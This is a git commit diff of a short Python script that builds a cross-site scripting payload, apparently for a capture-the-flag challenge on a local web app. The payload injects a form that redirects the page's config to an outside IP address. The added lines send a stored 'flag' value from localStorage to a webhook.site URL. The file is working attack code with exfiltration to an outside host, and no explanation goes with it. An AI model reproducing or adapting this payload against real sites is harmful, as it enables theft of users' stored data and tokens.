6580920b8b2d0d2cc40da42a148a1b79ea88d227
solovvway <ya2@thinkpad>
2025-10-29 21:29:54 +0300

    add exploit fixes

--- x6.py
+++ x6.py
@@ -15,13 +15,13 @@ def generate_children_json(payload):
     return quote(json.dumps(json_structure, separators=(',', ':')))
 
 base = "http://localhost:3000/"
-
+webhook = 'https://webhook.site/0feb7c89-a0ea-4554-81b5-b7dc8caae55d'
 payload = """fetch('http://localhost:3000/about', { credentials: 'include' });
 const form = document.createElement('form');
 form.id = 'config';
 form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
 document.body.appendChild(form);"""
-
+payload += 'setTimeout(() => { fetch("WEBHOOK"+"?flag="+localStorage.getItem("debugvaluefortesting")); }, 3000);'.replace('WEBHOOK', webhook)
 children_json_quoted = generate_children_json(payload)
 url_p = f"{base}?name=span&src=&childrenJson={children_json_quoted}"
 
